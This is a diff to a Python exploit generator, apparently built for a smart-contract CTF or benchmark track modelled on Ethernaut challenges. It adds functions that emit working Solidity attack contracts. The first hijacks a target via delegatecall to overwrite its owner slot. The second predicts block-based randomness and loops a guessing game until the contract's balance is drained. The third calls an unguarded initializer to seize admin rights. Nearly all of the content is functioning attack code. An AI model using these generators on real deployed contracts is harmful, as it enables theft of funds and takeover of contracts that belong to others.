@@ -3,10 +3,17 @@
 # 결정론적으로 생성한다. 함수 이름을 하드코딩하지 않고 스캔 결과에서 가져오되,
 # 못 찾으면 이 트랙 공개셋의 관례적 이름으로 폴백한다.
 import random
+import re
 
-from scanner import FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE
+from scanner import (
+    FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE,
+    FAM_DELEGATECALL, FAM_RANDOMNESS, FAM_INIT,
+)
 
-STRATEGY_ORDER = [FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE]
+STRATEGY_ORDER = [
+    FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE,
+    FAM_DELEGATECALL, FAM_RANDOMNESS, FAM_INIT,
+]
 
 HEADER = "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n"
 
@@ -43,6 +50,12 @@ def build_exploit(fam, findings):
         return _integer(findings)
     if fam == FAM_ORACLE:
         return _oracle(findings)
+    if fam == FAM_DELEGATECALL:
+        return _delegatecall(findings)
+    if fam == FAM_RANDOMNESS:
+        return _randomness(findings)
+    if fam == FAM_INIT:
+        return _init(findings)
     return None
 
 
@@ -191,6 +204,155 @@ def _oracle(findings):
         "        uint256 price = IPool(pool).spotPrice();\n"
         "        uint256 value = (o.collateralOf(address(this)) * price) / 1e18;\n"
         f"        o.{borrow}(value);\n"
+        "    }\n"
+        "    receive() external payable {}\n"
+        "}\n"
+    )
+    return HEADER + body
+
+
+def _delegatecall(findings):
+    """Ethernaut Delegation/Preservation class: the target delegatecalls an
+    attacker-supplied module, so a module that writes storage slot 0 seizes
+    `owner`/`admin`. We deploy such a module and route the target through it."""
+    entry = findings.get("delegatecall_entry")
+    if not entry or not entry.get("has_bytes"):
+        return None
+    name = entry["fn"]["name"]
+    # Reconstruct the entry signature: (address <recv>, bytes <data>) in the
+    # order they were declared, so we call it exactly as the target expects.
+    args = entry["fn"]["args"]
+    parts = []
+    call_args = []
+    for typ, _an in args:
+        if typ == "address":
+            parts.append("address")
+            call_args.append("address(pwn)")
+        elif typ.startswith("bytes"):
+            parts.append("bytes calldata")  # reference type needs a data location
+            call_args.append('abi.encodeWithSignature("hijack()")')
+        elif typ.startswith("uint"):
+            parts.append("uint256")
+            call_args.append("0")
+        else:
+            parts.append(typ)
+            call_args.append("0")
+    sig_types = ",".join(parts)
+    call = f"        t.{name}({', '.join(call_args)});"
+    body = (
+        "// Strategy: delegatecall hijack — the target delegatecalls a module\n"
+        "// we control, so our module runs in the target's storage context and\n"
+        "// overwrites slot 0 (owner/admin). No import needed.\n"
+        "interface ITarget {\n"
+        f"    function {name}({sig_types}) external;\n"
+        "}\n\n"
+        "contract Pwn {\n"
+        "    // slot 0 aligns with the target's owner/admin slot under delegatecall\n"
+        "    address public slot0;\n"
+        "    function hijack() external { slot0 = msg.sender; }\n"
+        "}\n\n"
+        "contract Exploit {\n"
+        "    function run(address _t) external payable {\n"
+        "        ITarget t = ITarget(_t);\n"
+        "        Pwn pwn = new Pwn();\n"
+        f"{call}\n"
+        "    }\n"
+        "    receive() external payable {}\n"
+        "}\n"
+    )
+    return HEADER + body
+
+
+def _randomness(findings):
+    """Ethernaut CoinFlip / Capture-the-Ether Predict-the-Future class: the
+    payout is gated on block entropy the caller can read in the same tx. We
+    replicate the exact mixing expression and always submit the winning value,
+    looping until the house float is drained below its solvency floor."""
+    fn = findings.get("randomness_fn")
+    if not fn:
+        return None
+    name = fn["name"]
+    b = fn["body"]
+    # Reproduce the target's own entropy expression verbatim so the computed
+    # value is identical (block.* globals resolve the same inside Exploit).
+    # Capture the full right-hand side of the entropy-bearing assignment up to
+    # its terminating ';' — this keeps nested parentheses balanced and picks up
+    # any trailing `% N` mixing without brittle sub-parsing.
+    rhs = re.search(r"=\s*([^;]*(?:block\.|blockhash)[^;]*?)\s*;", b, re.S)
+    if rhs:
+        rand_expr = rhs.group(1).strip()
+    else:
+        # fall back to a common predictable source
+        rand_expr = "uint256(blockhash(block.number - 1))"
+    ante_m = re.search(r"msg\.value\s*==\s*(\d+)\s*ether", b)
+    ante = f"{ante_m.group(1)} ether" if ante_m else "1 ether"
+    payout_m = re.search(r"call\s*\{\s*value\s*:\s*(\d+)\s*ether", b)
+    payout = f"{payout_m.group(1)} ether" if payout_m else "1 ether"
+    # match the guess parameter type (default uint256)
+    guess_type = "uint256"
+    for typ, _an in fn["args"]:
+        if typ.startswith("uint") or typ == "bool":
+            guess_type = "uint256" if typ.startswith("uint") else "bool"
+            break
+    if guess_type == "bool":
+        pick = f"(({rand_expr}) == 1)"
+        param = "bool"
+    else:
+        pick = f"({rand_expr})"
+        param = "uint256"
+    body = (
+        "// Strategy: weak randomness — the payout is decided by block entropy\n"
+        "// the caller can read in the same transaction. We compute the exact\n"
+        "// same value and submit it as our guess, draining the house float.\n"
+        "interface ITarget {\n"
+        f"    function {name}({param} guess) external payable;\n"
+        "}\n\n"
+        "contract Exploit {\n"
+        f"    uint256 constant ANTE = {ante};\n"
+        f"    uint256 constant PAYOUT = {payout};\n"
+        "    function run(address _t) external payable {\n"
+        "        ITarget t = ITarget(_t);\n"
+        "        for (uint256 i = 0; i < 64; i++) {\n"
+        "            if (_t.balance < PAYOUT) break;\n"
+        f"            {param} guess = {pick};\n"
+        f"            t.{name}{{value: ANTE}}(guess);\n"
+        "        }\n"
+        "    }\n"
+        "    receive() external payable {}\n"
+        "}\n"
+    )
+    return HEADER + body
+
+
+def _init(findings):
+    """Ethernaut Motorbike / uninitialized-proxy class: an initializer with no
+    `initialized` guard and no access control lets the first caller take the
+    admin/owner slot. We simply call it and become the privileged account."""
+    fn = findings.get("init_fn")
+    if not fn:
+        return None
+    name = fn["name"]
+    addr_args = [a for a in fn["args"] if a[0] == "address"]
+    if addr_args:
+        iface = f"    function {name}(address) external;"
+        call = f"        t.{name}(address(this));"
+    elif fn["args"]:
+        # unexpected arity — fall back to no-arg attempt guarded by interface
+        iface = f"    function {name}() external;"
+        call = f"        t.{name}();"
+    else:
+        iface = f"    function {name}() external;"
+        call = f"        t.{name}();"
+    body = (
+        "// Strategy: unprotected initializer — the admin/owner slot is left\n"
+        "// claimable, so we call the open initializer and seize it.\n"
+        "interface ITarget {\n"
+        f"{iface}\n"
+        "}\n\n"
+        "contract Exploit {\n"
+        "    function run(address _t) external payable {\n"
+        "        ITarget t = ITarget(_t);\n"
+        f"{call}\n"
         "    }\n"
         "    receive() external payable {}\n"
         "}\n"
